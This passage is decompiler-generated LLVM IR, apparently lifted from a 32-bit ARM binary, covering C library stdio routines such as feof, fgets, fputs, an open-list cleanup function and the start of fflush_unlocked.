  %v0_c188 = load i32, i32* %r0.global-to-local, align 4
  %v1_c188 = trunc i32 %v0_c188 to i8
  %v3_c188 = add i32 %v0_c184, 38
  %v4_c188 = inttoptr i32 %v3_c188 to i8*
  store i8 %v1_c188, i8* %v4_c188, align 1
  %v0_c18c = load i32, i32* %r2.global-to-local, align 4
  %v3_c18c = mul i32 %v0_c18c, 4
  store i32 %v3_c18c, i32* @r2, align 4
  %v0_c190 = load i32, i32* %r7.global-to-local, align 4
  %v1_c190 = add i32 %v0_c190, 40
  store i32 %v1_c190, i32* @r0, align 4
  %v2_c194 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_c194, i32* @r1, align 4
  %v0_c198 = call i32 @memcpy()
  store i32 %v0_c198, i32* %r0.global-to-local, align 4
  %v0_c19c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_c16c, %dec_label_pc_c184
  %v2_c1b8 = phi i32 [ %v0_c19c.pre, %dec_label_pc_c184 ], [ %v0_c16c, %dec_label_pc_c16c ]
  %v1_c19c = add i32 %v2_c1b8, 16
  %v2_c19c = inttoptr i32 %v1_c19c to i32*
  %v3_c19c = load i32, i32* %v2_c19c, align 4
  store i32 %v3_c19c, i32* %r3.global-to-local, align 4
  %v1_c1a0 = and i32 %v3_c19c, 128
  %v2_c1a0 = icmp eq i32 %v1_c1a0, 0
  br i1 %v2_c1a0, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_c19c
  store i32 %v2_bd44, i32* %r3.global-to-local, align 4
  %v2_c1a8 = inttoptr i32 %v2_c1b8 to i32*
  %v3_c1a8 = load i32, i32* %v2_c1a8, align 4
  %v2_c1b0.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_c1b0 = sub i32 %v2_c1b0.pre, %v2_bd44
  store i32 %v3_c1b0, i32* %r3.global-to-local, align 4
  %v5_c1b4 = mul i32 %v3_c1b0, 4
  %v6_c1b4 = add i32 %v5_c1b4, %v3_c1a8
  store i32 %v6_c1b4, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_c19c
  %v1_c1ac41 = load i32, i32* %r6.global-to-local, align 4
  %v2_c1ac42 = add i32 %v1_c1ac41, 1
  store i32 %v2_c1ac42, i32* %r3.global-to-local, align 4
  %v3_c1b8 = inttoptr i32 %v2_c1b8 to i32*
  store i32 %v2_c1ac42, i32* %v3_c1b8, align 4
  %v0_c1bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_c1c4 = phi i32 [ %v2_c1b8, %.thread44 ], [ %v0_c1bc.pre, %.thread46 ]
  %v1_c1bc = add i32 %v1_c1c4, 28
  %v2_c1bc = inttoptr i32 %v1_c1bc to i32*
  %v3_c1bc = load i32, i32* %v2_c1bc, align 4
  store i32 %v3_c1bc, i32* %r3.global-to-local, align 4
  %v1_c1c0 = add i32 %v3_c1bc, 2
  store i32 %v1_c1c0, i32* %r0.global-to-local, align 4
  %v0_c1c4 = load i32, i32* %sb.global-to-local, align 4
  %v2_c1c4 = add i32 %v1_c1c4, 24
  %v3_c1c4 = inttoptr i32 %v2_c1c4 to i32*
  store i32 %v0_c1c4, i32* %v3_c1c4, align 4
  br i1 %v2_c1a0, label %dec_label_pc_c1d4, label %bb147

bb147:                                            ; preds = %bb146
  %v1_c1c8 = load i32, i32* @r2, align 4
  %v2_c1c8 = load i32, i32* %r7.global-to-local, align 4
  %v3_c1c8 = inttoptr i32 %v2_c1c8 to i32*
  store i32 %v1_c1c8, i32* %v3_c1c8, align 4
  br label %dec_label_pc_c1d4

dec_label_pc_c1d0:                                ; preds = %dec_label_pc_bd8c, %dec_label_pc_be98, %dec_label_pc_bf48, %dec_label_pc_bf1c, %dec_label_pc_bf28, %dec_label_pc_be68, %dec_label_pc_c108, %dec_label_pc_c0b4, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1d4

dec_label_pc_c1d4:                                ; preds = %bb147, %bb146, %dec_label_pc_c1d0
  %v2_c1d8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_c1d8, i32* @r4, align 4
  store i32 %v6_bd3c, i32* @r5, align 4
  %v26_c1d8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_c1d8

; uselistorder directives
  uselistorder i32 %v3_c1b0, { 1, 0 }
  uselistorder i32 %v1_c170, { 1, 2, 0 }
  uselistorder i32 %v0_c124, { 1, 2, 0 }
  uselistorder i32 %v2_c100, { 1, 0 }
  uselistorder i32 %v1_c100, { 1, 0, 2 }
  uselistorder i32 %v0_c120, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_c064, { 1, 2, 0 }
  uselistorder i32 %v3_c04c, { 1, 0 }
  uselistorder i32 %v3_c044, { 1, 0 }
  uselistorder i32 %v2_c024, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_c00c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_bff0, { 1, 0, 2 }
  uselistorder i32 %v3_bfd0, { 2, 1, 0 }
  uselistorder i32 %v1_bf94, { 0, 2, 3, 1 }
  uselistorder i32 %v2_bf68, { 1, 0 }
  uselistorder i32 %v5_bec8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bec8, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_be74, { 1, 0 }
  uselistorder i32 %v0_be90, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_be58, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_be40, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_be2c, { 1, 2, 0 }
  uselistorder i32 %v0_bea4, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_bde0, { 1, 0 }
  uselistorder i32 %v1_bdb0, { 0, 2, 1 }
  uselistorder i32 %v25_bd3c, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 8, 0, 4, 5, 6, 1, 2, 3, 7, 9 }
  uselistorder i32* %r8.global-to-local, { 8, 7, 5, 6, 0, 3, 2, 1, 4 }
  uselistorder i32* %r7.global-to-local, { 15, 3, 2, 16, 6, 17, 0, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 1, 18 }
  uselistorder i32* %r6.global-to-local, { 10, 12, 13, 9, 3, 5, 14, 6, 7, 8, 0, 1, 2, 15, 4, 11 }
  uselistorder i32* %r3.global-to-local, { 45, 0, 5, 46, 47, 48, 49, 50, 3, 4, 6, 7, 8, 9, 11, 10, 1, 2, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 35, 36, 37, 33, 34, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32* %r2.global-to-local, { 23, 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 16, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 10, 11, 0, 15 }
  uselistorder i32* %r0.global-to-local, { 26, 27, 25, 28, 3, 24, 2, 4, 5, 6, 7, 8, 15, 14, 9, 17, 10, 11, 12, 18, 13, 19, 20, 1, 21, 22, 23, 16, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_14384.479 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_14394.477 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_143b0.471 to i32), { 2, 1, 3, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_14370.469 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0 }
  uselistorder label %dec_label_pc_c1d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c1d0, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_c19c, { 1, 0 }
  uselistorder label %dec_label_pc_c16c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c158, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c114, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_c0cc, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bf80, { 1, 0 }
  uselistorder label %dec_label_pc_bf58, { 1, 0 }
  uselistorder label %dec_label_pc_bf08, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_be88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_be84, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bde4, { 1, 0 }
  uselistorder label %dec_label_pc_bdd4, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c200 = load i32, i32* @r4, align 4
  store i32 %v3_c200, i32* %stack_var_-16, align 4
  %v2_c204 = add i32 %tmp, 52
  %v3_c204 = inttoptr i32 %v2_c204 to i32*
  %v4_c204 = load i32, i32* %v3_c204, align 4
  store i32 %v4_c204, i32* %r6.global-to-local, align 4
  %v2_c20c = ptrtoint i32* %stack_var_-32 to i32
  %v2_c210 = icmp eq i32 %v4_c204, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_c20c, i32* @r0, align 4
  br i1 %v2_c210, label %dec_label_pc_c228, label %dec_label_pc_c244

dec_label_pc_c228:                                ; preds = %entry
  %v1_c230 = call i32 @__pthread_return_void()
  %v1_c240 = call i32 @__pthread_return_0()
  %v0_c244.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_c24c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c244

dec_label_pc_c244:                                ; preds = %entry, %dec_label_pc_c228
  %v0_c24c = phi i32 [ %v4_c204, %entry ], [ %v0_c24c.pre, %dec_label_pc_c228 ]
  %v0_c244 = phi i32 [ %tmp, %entry ], [ %v0_c244.pre, %dec_label_pc_c228 ]
  %v1_c244 = add i32 %v0_c244, 1
  %v2_c244 = inttoptr i32 %v1_c244 to i8*
  %v3_c244 = load i8, i8* %v2_c244, align 1
  %v4_c244 = zext i8 %v3_c244 to i32
  %v1_c248 = inttoptr i32 %v0_c244 to i8*
  %v2_c248 = load i8, i8* %v1_c248, align 1
  %v3_c248 = zext i8 %v2_c248 to i32
  %v2_c24c = icmp eq i32 %v0_c24c, 0
  %v4_c258 = mul nuw nsw i32 %v4_c244, 256
  %v5_c258 = or i32 %v3_c248, %v4_c258
  store i32 %v5_c258, i32* %r4.global-to-local, align 4
  br i1 %v2_c24c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c244
  call void @__pseudo_branch(i32 58724)
  %v0_c268.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c244, %bb
  %v0_c268 = phi i32 [ %v5_c258, %dec_label_pc_c244 ], [ %v0_c268.pre, %bb ]
  %v1_c268 = and i32 %v0_c268, 4
  %v2_c270 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_c270, i32* @r4, align 4
  ret i32 %v1_c268

; uselistorder directives
  uselistorder i32 %v0_c244, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_c244, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_c284 = load i32, i32* @r4, align 4
  store i32 %v3_c284, i32* %stack_var_-24, align 4
  %v6_c284 = load i32, i32* @r5, align 4
  %v9_c284 = load i32, i32* @r6, align 4
  %v12_c284 = load i32, i32* @r7, align 4
  %v1_c288 = add i32 %arg3, 52
  %v2_c288 = inttoptr i32 %v1_c288 to i32*
  %v3_c288 = load i32, i32* %v2_c288, align 4
  store i32 %v3_c288, i32* %r8.global-to-local, align 4
  %v2_c28c = ptrtoint i32* %stack_var_-40 to i32
  %v1_c290 = add i32 %arg3, 56
  store i32 %v1_c290, i32* @r5, align 4
  %v2_c294 = icmp eq i32 %v3_c288, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_c28c, i32* @r0, align 4
  br i1 %v2_c294, label %dec_label_pc_c2b4, label %dec_label_pc_c2d0

dec_label_pc_c2b4:                                ; preds = %entry
  %v1_c2bc = call i32 @__pthread_return_void()
  store i32 49872, i32* @lr, align 4
  %v1_c2cc = call i32 @__pthread_return_0()
  %v0_c2d0.pre = load i32, i32* @r6, align 4
  %v0_c2d4.pre = load i32, i32* @r4, align 4
  %v0_c2d8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c2d0

dec_label_pc_c2d0:                                ; preds = %entry, %dec_label_pc_c2b4
  %v0_c2d8 = phi i32 [ %arg1, %entry ], [ %v0_c2d8.pre, %dec_label_pc_c2b4 ]
  %v0_c2d4 = phi i32 [ %arg3, %entry ], [ %v0_c2d4.pre, %dec_label_pc_c2b4 ]
  %v0_c2d0 = phi i32 [ %arg2, %entry ], [ %v0_c2d0.pre, %dec_label_pc_c2b4 ]
  %v3_c2dc = inttoptr i32 %v0_c2d8 to i8*
  %v4_c2dc = call i32 @__GI_fgets_unlocked(i8* %v3_c2dc, i32 %v0_c2d0, i32 %v0_c2d4)
  %v0_c2e0 = load i32, i32* %r8.global-to-local, align 4
  %v2_c2e0 = icmp eq i32 %v0_c2e0, 0
  store i32 %v4_c2dc, i32* %r4.global-to-local, align 4
  br i1 %v2_c2e0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c2d0
  store i32 49916, i32* @lr, align 4
  call void @__pseudo_branch(i32 58724)
  %v0_c2fc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c2d0, %bb
  %v0_c2fc = phi i32 [ %v4_c2dc, %dec_label_pc_c2d0 ], [ %v0_c2fc.pre, %bb ]
  %v2_c304 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_c304, i32* @r4, align 4
  store i32 %v6_c284, i32* @r5, align 4
  store i32 %v9_c284, i32* @r6, align 4
  store i32 %v12_c284, i32* @r7, align 4
  ret i32 %v0_c2fc

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_c2d0, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c318 = load i32, i32* @r4, align 4
  store i32 %v3_c318, i32* %stack_var_-20, align 4
  %v6_c318 = load i32, i32* @r5, align 4
  %v9_c318 = load i32, i32* @r6, align 4
  %v12_c318 = load i32, i32* @r7, align 4
  %v1_c31c = add i32 %arg2, 52
  %v2_c31c = inttoptr i32 %v1_c31c to i32*
  %v3_c31c = load i32, i32* %v2_c31c, align 4
  store i32 %v3_c31c, i32* @r7, align 4
  %v1_c320 = add i32 %arg2, 56
  store i32 %v1_c320, i32* @r5, align 4
  %v2_c324 = ptrtoint i32* %stack_var_-36 to i32
  %v2_c328 = icmp eq i32 %v3_c31c, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_c324, i32* @r0, align 4
  br i1 %v2_c328, label %dec_label_pc_c344, label %dec_label_pc_c360

dec_label_pc_c344:                                ; preds = %entry
  %v1_c34c = call i32 @__pthread_return_void()
  store i32 50016, i32* @lr, align 4
  %v1_c35c = call i32 @__pthread_return_0()
  %v0_c360.pre = load i32, i32* @r4, align 4
  %v0_c364.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_c360

dec_label_pc_c360:                                ; preds = %entry, %dec_label_pc_c344
  %v0_c364 = phi i32 [ %arg1, %entry ], [ %v0_c364.pre, %dec_label_pc_c344 ]
  %v0_c360 = phi i32 [ %arg2, %entry ], [ %v0_c360.pre, %dec_label_pc_c344 ]
  %v2_c368 = inttoptr i32 %v0_c364 to i8*
  %v3_c368 = call i32 @__GI_fputs_unlocked(i8* %v2_c368, i32 %v0_c360)
  %v0_c36c = load i32, i32* @r7, align 4
  %v2_c36c = icmp eq i32 %v0_c36c, 0
  store i32 %v3_c368, i32* %r4.global-to-local, align 4
  br i1 %v2_c36c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c360
  call void @__pseudo_branch(i32 58724)
  %v0_c388.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c360, %bb
  %v0_c388 = phi i32 [ %v3_c368, %dec_label_pc_c360 ], [ %v0_c388.pre, %bb ]
  %v2_c390 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c390, i32* @r4, align 4
  store i32 %v6_c318, i32* @r5, align 4
  store i32 %v9_c318, i32* @r6, align 4
  store i32 %v12_c318, i32* @r7, align 4
  ret i32 %v0_c388

; uselistorder directives
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_c360, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_c3a8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_c3ac = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_c3ac, i32* @r0, align 4
  store i32 58724, i32* %r4.global-to-local, align 4
  %v1_c3c0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r5.global-to-local, align 4
  %v1_c3d0 = call i32 @__pthread_return_0()
  %v2_c3d8 = load i32, i32* @global_var_1ec04.411, align 4
  %v7_c3dc = icmp eq i32 %v2_c3d8, 1
  br i1 %v7_c3dc, label %dec_label_pc_c3e4, label %dec_label_pc_c490

dec_label_pc_c3e4:                                ; preds = %entry
  %v2_c3e8 = load i32, i32* @global_var_1ec08.416, align 4
  %tmp19 = icmp slt i32 %v2_c3e8, 1
  br i1 %tmp19, label %dec_label_pc_c490, label %dec_label_pc_c3f4

dec_label_pc_c3f4:                                ; preds = %dec_label_pc_c3e4
  store i32 %v2_c3a8, i32* @r0, align 4
  %v1_c404 = call i32 @__pthread_return_void()
  %v1_c410 = call i32 @__pthread_return_0()
  %v2_c418 = load i32, i32* bitcast (i32** @global_var_1e488.433 to i32*), align 4
  store i32 %v2_c418, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_c4683 = icmp eq i32 %v2_c418, 0
  br i1 %v2_c4683, label %dec_label_pc_c474, label %dec_label_pc_c424

dec_label_pc_c424:                                ; preds = %dec_label_pc_c3f4, %dec_label_pc_c464
  %v1_c43c = phi i32 [ %v0_c464, %dec_label_pc_c464 ], [ %v2_c418, %dec_label_pc_c3f4 ]
  %v1_c424 = inttoptr i32 %v1_c43c to i8*
  %v2_c424 = load i8, i8* %v1_c424, align 1
  %v3_c424 = zext i8 %v2_c424 to i32
  %v1_c428 = add i32 %v1_c43c, 1
  %v2_c428 = inttoptr i32 %v1_c428 to i8*
  %v3_c428 = load i8, i8* %v2_c428, align 1
  %v4_c428 = zext i8 %v3_c428 to i32
  %v4_c42c = mul nuw nsw i32 %v4_c428, 256
  %v5_c42c = or i32 %v4_c42c, %v3_c424
  %v2_c430 = and i32 %v5_c42c, 32816
  %v7_c434 = icmp eq i32 %v2_c430, 48
  %v1_c438 = add i32 %v1_c43c, 32
  %v2_c438 = inttoptr i32 %v1_c438 to i32*
  %v3_c438 = load i32, i32* %v2_c438, align 4
  store i32 %v3_c438, i32* %r5.global-to-local, align 4
  br i1 %v7_c434, label %dec_label_pc_c444, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_c424
  store i32 %v1_c43c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c464

dec_label_pc_c444:                                ; preds = %dec_label_pc_c424
  %v0_c444 = load i32, i32* %r6.global-to-local, align 4
  %v2_c444 = icmp eq i32 %v0_c444, 0
  br i1 %v2_c444, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_c444
  %v3_c44c = add i32 %v0_c444, 32
  %v4_c44c = inttoptr i32 %v3_c44c to i32*
  store i32 %v3_c438, i32* %v4_c44c, align 4
  %v0_c454.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_c444
  store i32 %v3_c438, i32* bitcast (i32** @global_var_1e488.433 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_c454 = phi i32 [ %v0_c454.pre, %.thread ], [ %v1_c43c, %.thread1 ]
  %v1_c454 = add i32 %v0_c454, 1
  %v2_c454 = inttoptr i32 %v1_c454 to i8*
  %v3_c454 = load i8, i8* %v2_c454, align 1
  %v1_c458 = and i8 %v3_c454, 32
  %v1_c460 = icmp ne i8 %v1_c458, 0
  call void @__pseudo_cond_branch(i1 %v1_c460, i32 ptrtoint (i32* @global_var_d4a4.413 to i32))
  %v0_c464.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_c464

dec_label_pc_c464:                                ; preds = %.thread12, %bb
  %v0_c464 = phi i32 [ %v0_c464.pre, %bb ], [ %v3_c438, %.thread12 ]
  store i32 %v0_c464, i32* %r4.global-to-local, align 4
  %v2_c468 = icmp eq i32 %v0_c464, 0
  br i1 %v2_c468, label %dec_label_pc_c474, label %dec_label_pc_c424

dec_label_pc_c474:                                ; preds = %dec_label_pc_c464, %dec_label_pc_c3f4
  store i32 %v2_c3a8, i32* @r0, align 4
  %v1_c484 = call i32 @__pthread_return_void()
  %v0_c48c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c48c, i32* @global_var_1ec08.416, align 4
  %v2_c494.pre = load i32, i32* @global_var_1ec04.411, align 4
  br label %dec_label_pc_c490

dec_label_pc_c490:                                ; preds = %entry, %dec_label_pc_c3e4, %dec_label_pc_c474
  %v2_c494 = phi i32 [ %v2_c3d8, %entry ], [ 1, %dec_label_pc_c3e4 ], [ %v2_c494.pre, %dec_label_pc_c474 ]
  %v1_c498 = add i32 %v2_c494, -1
  store i32 %v1_c498, i32* @global_var_1ec04.411, align 4
  store i32 %v2_c3ac, i32* @r0, align 4
  store i32 50356, i32* @lr, align 4
  %v1_c4b0 = call i32 @__pthread_return_void()
  ret i32 %v1_c4b0

; uselistorder directives
  uselistorder i32 %v0_c464, { 2, 1, 0 }
  uselistorder i32 %v3_c438, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c43c, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* @global_var_1ec08.416, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_c490, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c464, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_c424, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c4e4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_1e488.433 to i32), i32* %r3.global-to-local, align 4
  %v10_c4ec = icmp eq i8* %arg1, bitcast (i32** @global_var_1e488.433 to i8*)
  store i1 %v10_c4ec, i1* %cpsr_z.global-to-local, align 1
  %.v1_c4f0 = select i1 %v10_c4ec, i32 0, i32 %tmp
  store i32 %.v1_c4f0, i32* %r8.global-to-local, align 4
  %v2_c4f8 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_c4ec, label %bb, label %dec_label_pc_c504

bb:                                               ; preds = %entry
  store i32 %.v1_c4f0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_c510

dec_label_pc_c504:                                ; preds = %entry
  %v2_c504 = icmp eq i32 %.v1_c4f0, 0
  store i1 %v2_c504, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_c504, label %dec_label_pc_c510, label %dec_label_pc_c65c

dec_label_pc_c510:                                ; preds = %bb, %dec_label_pc_c504
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_c4f8, i32* @r0, align 4
  %v1_c524 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1e4a4.409 to i32), i32* %r0.global-to-local, align 4
  %v1_c534 = call i32 @__pthread_return_0()
  %v2_c53c = load i32, i32* @global_var_1ec04.411, align 4
  %v1_c540 = add i32 %v2_c53c, 1
  store i32 %v1_c540, i32* %r3.global-to-local, align 4
  store i32 %v1_c540, i32* @global_var_1ec04.411, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_c4f8, i32* @r0, align 4
  %v1_c558 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_c4f8, i32* @r0, align 4
  %v1_c56c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1e48c.430 to i32), i32* %r0.global-to-local, align 4
  %v1_c578 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_1e488.433 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_c4f8, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_c588 = load i32, i32* bitcast (i32** @global_var_1e488.433 to i32*), align 4
  store i32 %v2_c588, i32* @r6, align 4
  %v1_c590 = call i32 @__pthread_return_void()
  store i32 %v1_c590, i32* %r0.global-to-local, align 4
  store i32 %v2_c4f8, i32* @r4, align 4
  %v0_c598 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_c598, i32* @r5, align 4
  %v0_c64c.pr = load i32, i32* @r6, align 4
  %v2_c64c25 = icmp eq i32 %v0_c64c.pr, 0
  store i1 %v2_c64c25, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c64c25, label %dec_label_pc_c654, label %dec_label_pc_c5a0

dec_label_pc_c5a0:                                ; preds = %dec_label_pc_c510, %.thread11
  %v0_c5bc = phi i32 [ %v3_c648, %.thread11 ], [ %v0_c64c.pr, %dec_label_pc_c510 ]
  %v1_c5a0 = inttoptr i32 %v0_c5bc to i8*
  %v2_c5a0 = load i8, i8* %v1_c5a0, align 1
  %v3_c5a0 = zext i8 %v2_c5a0 to i32
  store i32 %v3_c5a0, i32* %r3.global-to-local, align 4
  %v1_c5a4 = and i32 %v3_c5a0, 64
  %v2_c5a4 = icmp eq i32 %v1_c5a4, 0
  store i1 %v2_c5a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c5a4, label %.thread11, label %dec_label_pc_c5ac

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c5a0
  %v2_c5b0 = load i32, i32* @global_var_1e4bc.424, align 4
  store i32 %v2_c5b0, i32* %r3.global-to-local, align 4
  %v7_c5b4 = icmp eq i32 %v2_c5b0, 2
  store i1 %v7_c5b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c5b4, label %dec_label_pc_c5e8, label %dec_label_pc_c5bc

dec_label_pc_c5bc:                                ; preds = %dec_label_pc_c5ac
  %v1_c5bc = add i32 %v0_c5bc, 56
  store i32 %v1_c5bc, i32* @r4, align 4
  store i32 %v2_c4f8, i32* @r0, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r1.global-to-local, align 4
  %v1_c5d4 = call i32 @__pthread_return_void()
  %v0_c5d8 = load i32, i32* @r4, align 4
  store i32 %v0_c5d8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r3.global-to-local, align 4
  %v1_c5e4 = call i32 @__pthread_return_0()
  store i32 %v1_c5e4, i32* %r0.global-to-local, align 4
